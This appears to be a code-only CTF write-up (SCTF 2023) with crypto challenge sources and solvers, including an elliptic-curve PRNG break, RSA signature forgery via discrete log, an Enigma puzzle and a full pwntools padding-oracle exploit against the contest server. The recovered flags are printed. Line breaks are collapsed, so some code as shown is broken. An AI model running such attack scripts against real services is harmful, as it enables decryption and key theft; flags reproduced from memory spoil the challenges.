def enc(input,len):    for i in range(len):        input[i] = input[i] - 1        input[i] = input[i] ^ 0x35        input[i] = (input[i] * 16) | (input[i] >> 4)        input[i] = input[i] ^ input[(i+1)%len]        input[i] = input[i] + 1        input[i] = (input[i] * 32) | (input[i] >> 3)        input[i] = input[i] ^ input[9 - i]        input[i] = input[i] ^ 0xF7        input[i] = (input[i] << 6) | (input[i] >> 2)
```



```
#include <iostream>
char __fastcall sub_8001A8C(char a1) {  return (((a1 >> 6) & (a1 >> 2) & 1) == 0) | (2 * a1);}
int main() {  char enc[] = "bdgfciejha";  unsigned char test[10] = { 0x77, 0xee, 0xdc, 0xb8, 0x71, 0xe3, 0xc7, 0x8e, 0x1d, 0x3b }; 
  for (int i = 1; i < 10; i++) {    test[i] = sub_8001A8C(test[i - 1]);  }  for (int i = 0; i < 10; i++) {    for (int j = 0; j < 10; j++) {      if (enc[j] == i + 'a') {        printf("%hhx", test[j]);        break;      }    }
  }  printf("n");  unsigned char input[10] = { 0x3b, 0x77, 0x71, 0xee, 0xc7, 0xb8, 0xdc, 0x1d, 0xe3, 0x8e }; //bf
  for (int i = 0; i < 10; i++) {    input[i] -= 1;  }  for (int i = 0; i < 10; i++) {    input[i] ^= 0x35;  }
  for (int i = 0; i < 10; i++) { //g    input[i] = (input[i] << 4) | (input[i] >> 4);  }
  for (int i = 0; i < 10; i++) {    input[i] ^= input[(i + 1) % 10];  }  for (int i = 0; i < 10; i++) {    input[i] += 1;  }  for (int i = 0; i < 10; i++) {    input[i] = (input[i] << 5) | (input[i] >> 3);  }  for (int i = 0; i < 10; i++) { //e    input[i] ^= input[9 - i];  }  for (int i = 0; i < 10; i++) { //j    input[i] ^= 0xf7;  }
  for (int i = 0; i < 10; i++) {    input[i] = ( input[i] << 6) | (input[i] >> 2);  }
  for (int i = 0; i < 10; i++) {    printf("%02hhx", input[i]);  }}
```



```
from Crypto.Util.number import *from random import *from secrets import flag

def gen_random(seed, P, Q, r_list, times):    s = seed    for i in range(times):        s = int((s * P)[0])        r = int((s * Q)[0])        r_list.append(r)    return r_list
def gen_seed():    seed = getRandomNBitInteger(32)    return seed
def getP_Q():    Q = Curve.random_point()    P = 114514*Q    return P, Q
def enc(flag, rlist):    seq = list(randint(0, 1) for _ in range(4))    add = rlist[55]*(seq[0]*rlist[66] + seq[1]*rlist[77] + seq[2]*rlist[88] + seq[3]*rlist[99])    xor = pow(rlist[114], rlist[514], rlist[233]*rlist[223])    enc = (bytes_to_long(flag)^^xor)+add    return enc
nums = 600
seed = gen_seed()
p = 58836547289031152641641668761108233140346455328711205590162376160181002854061F = GF(p)a = F(114)b = F(514)Curve = EllipticCurve(F, [a, b])P, Q = getP_Q()r_list = []r_list = gen_random(seed, P, Q, r_list, nums)ENCFLAG = enc(flag, r_list)print(ENCFLAG)print(P, Q)print(r_list[0])
'''4911741083112145038719536311222612998219730565328651097326896414315857050336523018712625917027324116103593300559128797807261543857571883314990480072241188##########################################################################Oh no, P, Q and r_list[0] are accidentally lost, but John seems to know, you can ask him about these missing values ::>_<::'''
```



```
from Crypto.Util.number import *from params import N, E, Dfrom leak_data import P, Q, r_1import re
def challenge():    meum = '''option:    1: get pubkey    2: get sign    3: verify    4: exit'''    print("Hi, I am John. If you help me with my homework, I'll give you the data that I know (￣o￣) . z Z")    print(meum)    sign = None
    while True:        print('[+]input your option: ', end='')        your_input = input()
        if your_input == '1':            print(f'[+]N = {N}')            print(f'[+]e = {E}')            continue
        elif your_input == '2':            sign = pow(bytes_to_long(MSG.encode()), D, N)            print(f'[+]sign = {sign}')            continue
        elif your_input == '3':            if sign is None:                print('[+]Please input option 2 to generate sign first.')                continue            msg_user = input("[+]Please input your message: ")            n = int(input("[+]Please input n: "))            e = int(input("[+]Please input e: "))            if e <= 3:                print('[+]e is invalid')                break            else:                if re.match(r'I can not agree more!!!$', msg_user):                    if pow(bytes_to_long(msg_user.encode()), e, n) == sign:                        print("Goooooooood! You are my hero! I can give you the data that I know ╰(*°▽°*)╯")                        print(f'Leak_data: n P={P}n Q={Q}n first num in r_list={r_1}')                        break                    else:                        print('[+]Error signature!')                        break                else:                    print('[+]Error message!')                    break
        elif your_input == '4':            break
if __name__ == '__main__':    MSG = 'This is an easy challenge'    challenge()
```



```
from Crypto.Util.number import *
def gen_primes(nbit, imbalance):    """    :param nbit: 最终光滑数比特数    :param imbalance: 最小单位比特数    :return: 比特数    """    p = int(2)    FACTORS = [p]    while p.bit_length() < nbit - 2 * imbalance:        factor = getPrime(imbalance)        FACTORS.append(factor)        p *= factor    rbit = (nbit - p.bit_length()) // 2
    while True:        r, s = [getPrime(rbit) for _ in '01']        _p = p * r * s        if _p.bit_length() < nbit: rbit += 1        if _p.bit_length() > nbit: rbit -= 1        if isPrime(_p + 1):            FACTORS.extend((r, s))            p = _p + 1            break
    FACTORS.sort()    return (p, FACTORS)
MSG = 'This is an easy challenge'msg = 'I can not agree more!!!'sign = 2007693265003793531961671894515047380652880039368379717802504726955615563153911755018745338145752718217463688949530928466521446062822626671546131855463622
M = bytes_to_long(MSG.encode())m = bytes_to_long(msg.encode())
n, n_fac = gen_primes(512, 20)
# 离散对数sage求解（模数小 / 阶光滑）# h = g^x mod p# c1 = m^e mod n1p = ng = mh = signx = discrete_log(Mod(h,p),Mod(g,p))print(pow(m,x,p)==sign)print('n =', p)print('e =', x)
```



```
Goooooooood! You are my hero! I can give you the data that I know ╰(*°▽°*)╯Leak_data: P=(24181776889473219401017476947331354458592459788552219617833554538756564211844, 33783050059316681746742286692492975385672807657476634456871855157562656976035) Q=(16104852983623236554878602983757606922134442855643833150623643268638509292839, 3562830444362909774600777083869972812060967068803593091854731534842281574275) first num in r_list=50920555924101118476219158701093345090627150442059647242030060086626996278598
```



```
from tqdm import tqdmfrom Crypto.Util.number import *p = 58836547289031152641641668761108233140346455328711205590162376160181002854061F = GF(p)a = F(114)b = F(514)E = EllipticCurve(F, [a, b])

P=E(24181776889473219401017476947331354458592459788552219617833554538756564211844, 33783050059316681746742286692492975385672807657476634456871855157562656976035)Q=E(16104852983623236554878602983757606922134442855643833150623643268638509292839, 3562830444362909774600777083869972812060967068803593091854731534842281574275)
r0=50920555924101118476219158701093345090627150442059647242030060086626996278598enc=4911741083112145038719536311222612998219730565328651097326896414315857050336523018712625917027324116103593300559128797807261543857571883314990480072241188
rlist = [r0]for _ in range(600):    s = (E.lift_x(rlist[-1])*114514)[0]    rlist.append((s * Q)[0])    rlist = [int(i) for i in rlist]
for i in range(2^4):    seq = []    for j in range(4):        seq.append(i&1)        i >>=1
    add = rlist[55]*(seq[0]*rlist[66] + seq[1]*rlist[77] + seq[2]*rlist[88] + seq[3]*rlist[99])    xor = pow(rlist[114], rlist[514], rlist[233]*rlist[223])    flag = long_to_bytes(int((enc-add)^^xor))    if b'SCTF' in flag:        print(flag)  # SCTF{Th1s_i5_my_happy_s0ng_I_like_to_5ing_it_@ll_day_1ong}
```



```
from Crypto.Util.number import *from Crypto.Cipher import AESimport osfrom flag import flag
secret = os.urandom(16)*2sysKEY = os.urandom(8)aeskey = os.urandom(16)iv = os.urandom(16)
p = getPrime(256)q = getPrime(256)e = 0x10001d = inverse(e,(p-1)*(q-1))
n = p*q
def aes_enc(m,key,iv):    aes = AES.new(key,AES.MODE_CBC,iv)    c =  aes.encrypt(m)    return cdef aes_dec(c,key,iv):    aes = AES.new(key,AES.MODE_CBC,iv)    m =  aes.decrypt(c)    return mdef add_to_16(key):    padding = 16 - (len(key) % 16)    key += bytes([padding])*padding    return(key)
def unpadding(key):    padding = key[-1]    if(padding==0):        return key,False    for i in range(padding):        if key[-i-1]!=padding:            return key,False    key = key[:-padding]    return key,True
def check_token():    print("input your token")    print("key")    print(">",end='')    enc_key = input()        print("IV")    print(">",end='')    iv = input()    enc_key =  bytes.fromhex(enc_key)    iv =  bytes.fromhex(iv)    key_padding = aes_dec(enc_key,aeskey,iv)            dec_key,flag= unpadding(key_padding)        if(flag==False):        print("fake token")    else:        if(dec_key == sysKEY):            print("0.0")            print('N',hex(n))            print('E',hex(e))            print('c',pow(bytes_to_long(secret),e,n))        else:            print("0.0??")
def adminadmin():    print("input n:")    print(">",end='')    n = input()    print("input c:")    print(">",end='')    c = input()    n = bytes.fromhex(n)    c = bytes.fromhex(c)    n = bytes_to_long(n)    c = bytes_to_long(c)        secret = pow(c,d,n)    print("only admin can touch the answer[yes/no]")    op1 = input()    if(op1=='yes'):        print("input admin password:")        print(">",end='')        password = input()                adminKEY = bytes.fromhex(password)                if adminKEY==sysKEY:                m = long_to_bytes(secret,64)                        print(m[:2].hex())
key_padding = add_to_16(sysKEY)enc_key = aes_enc(key_padding,aeskey,iv)print('your token',enc_key.hex(),iv.hex())

menu = """1.check2.admin3.getflag"""
while 1:    print(menu)    print(">",end='')    op = input()        if(op=='1'):        check_token()        continue    if(op=='2'):        adminadmin()        continue    if(op=='3'):        print("oops! I forget to hide the backdoor!n>",end='')                tmp = bytes.fromhex(input())        if(tmp==secret):            print(flag)        continue        print("try again")
```



```
from pwn import *from Crypto.Util.strxor import strxor
context.log_level = 'debug'context.timeout = 5000

class sol():    def __init__(self):        self.sh = remote('1.14.95.121', 9999)        token, iv = self.sh.recvline_contains(b'token').split(b' ')[-2:]        self.token = bytes.fromhex(token.decode())        self.iv = bytes.fromhex(iv.decode())
    def unpadding(self, key):        padding = key[-1]        if (padding == 0):            return key, False        for i in range(padding):            if key[-i - 1] != padding:                return key, False        key = key[:-padding]        return key, True
    def padding_oracle(self, iv_: bytes, c: bytes):        self.sh.recvuntil(b'>')        self.sh.sendline(b'1')        self.sh.sendlineafter(b'>', c.hex().encode())        self.sh.sendlineafter(b'>', iv_.hex().encode())        tmp = self.sh.recvline()        if b'fake token' in tmp:            return False        if b'0.0??' in tmp:            return True        else:            self.N = eval(self.sh.recvline_contains(b'N').split(b' ')[-1])            self.e = 65537            self.c = int(self.sh.recvline_contains(b'c').split(b' ')[-1])            return True
    def _attack_block(self, padding_oracle, iv, c):        r = bytes()        for i in reversed(range(16)):            s = bytes([16 - i] * (16 - i))            for b in range(256):                iv_ = bytes(i) + strxor(s, bytes([b]) + r)                if padding_oracle(iv_, c):                    r = bytes([b]) + r                    print('r =', r)                    break            else:                raise ValueError(f"Unable to find decryption for {s}, {iv}, and {c}")
        return strxor(iv, r)
    def attack(self, padding_oracle, iv, c):        """        Recovers the plaintext using the padding oracle attack.        :param padding_oracle: the padding oracle, returns True if the padding is correct, False otherwise        :param iv: the initialization vector        :param c: the ciphertext        :return: the (padded) plaintext        """        assert len(c) == 16        p = self._attack_block(padding_oracle, iv, c[0:16])        return p
    def get_nec_admin_flag(self):        self.sh.recvuntil(b'>')        self.sh.sendline(b'1')        self.sh.sendlineafter(b'>', self.token.hex().encode())        self.sh.sendlineafter(b'>', self.iv.hex().encode())        self.N = eval(self.sh.recvline_contains(b'N').split(b' ')[-1])        self.e = 65537        self.c = int(self.sh.recvline_contains(b'c').split(b' ')[-1])        password = sysKEY.hex()
        start = 0        end = pow(2, 32 * 8)        mid = 1        for i in range(260):            mid = (start + end) // 2
            #  确保能成功转换            while True:                try:                    tmp_c = (self.c * pow(mid, self.e, self.N)) % self.N                    ttt = bytes.fromhex(hex(tmp_c)[2:])                    break                except:                    mid += 1
            self.sh.sendlineafter(b'>', b'2')            self.sh.sendlineafter(b'>', hex(self.N)[2:].encode())  # n            self.sh.sendlineafter(b'>', hex(tmp_c)[2:].encode())  # c            self.sh.recvuntil(b']')            self.sh.sendline(b'yes')            self.sh.sendlineafter(b'>', password.encode())  # pwd            tmp = self.sh.recvline().decode()[:2]            if tmp != '00':                end = mid            else:                start = mid            print(tmp, mid)
        secret = pow(2, 63 * 8) // mid        for i in range(-1001, 1001):            s = secret + i            try:                ttt = bytes.fromhex(hex(s)[2:])            except:                continue            self.sh.sendlineafter(b'>', b'3')            self.sh.sendlineafter(b'>', hex(s)[2:].encode())            tmp = self.sh.recvline()            if b'SCTF' in tmp:                print(tmp)                return

s = sol()key_padding = s.attack(s.padding_oracle, s.iv, s.token)sysKEY, _ = s.unpadding(key_padding)s.get_nec_admin_flag()  # SCTF{I7_Never_R4ins_1n_5outh3rn_Ca1iforni4}
```



```
alphabet = ('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z')rotor1 = ( 'E', 'K', 'M', 'F', 'L', 'G', 'D', 'Q', 'V', 'Z', 'N', 'T', 'O', 'W', 'Y', 'H', 'X', 'U', 'S', 'P', 'A', 'I', 'B', 'R', 'C', 'J')rotor2 = ( 'A', 'J', 'D', 'K', 'S', 'I', 'R', 'U', 'X', 'B', 'L', 'H', 'W', 'T', 'M', 'C', 'Q', 'G', 'Z', 'N', 'P', 'Y', 'F', 'V', 'O', 'E')rotor3 = ( 'B', 'D', 'F', 'H', 'J', 'L', 'C', 'P', 'R', 'T', 'X', 'V', 'Z', 'N', 'Y', 'E', 'I', 'W', 'G', 'A', 'K', 'M', 'U', 'S', 'Q', 'O')rotor4 = ( 'E', 'S', 'O', 'V', 'P', 'Z', 'J', 'A', 'Y', 'Q', 'U', 'I', 'R', 'H', 'X', 'L', 'N', 'F', 'T', 'G', 'K', 'D', 'C', 'M', 'W', 'B')rotor5 = ( 'V', 'Z', 'B', 'R', 'G', 'I', 'T', 'Y', 'U', 'P', 'S', 'D', 'N', 'H', 'L', 'X', 'A', 'W', 'M', 'J', 'Q', 'O', 'F', 'E', 'C', 'K')reflector = ( 'Y', 'R', 'U', 'H', 'Q', 'S', 'L', 'D', 'P', 'X', 'N', 'G', 'O', 'K', 'M', 'I', 'E', 'B', 'F', 'Z', 'C', 'W', 'V',  'J',  'A', 'T')plugboard = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
```



```
intercepted ciphers:TBFRZSFRYOXASAXHMU ->(plaitext is WIRHABENHEUTESONNE)NVILDEWRVPRYJRIBDTQPUTQUNBFDMPULTZWBNCXSJEIZUTJFPFOh shit! We can only knows that the plugboard settings contains "UX YC TV RB A? Q? I? G? F?"the flag is SYC{md5(m2)}
```



```
TBFRZSFRYOXASAXHMU->WIRHABENHQSZTCNIAR----------^
从Q开始不对了
```



```
WIRHABENHEUTESONNEATTACKATEIGHTOCLOCKFROMBOTHNOTHERNANDSOUTHERNSIDES
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/6-1687264506.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/1-1687264506.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/2-1687264506.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/9-1687264507.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/4-1687264507.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/1-1687264507.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/1-1687264509.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/4-1687264509.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/8-1687264509.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/5-1687264510.png)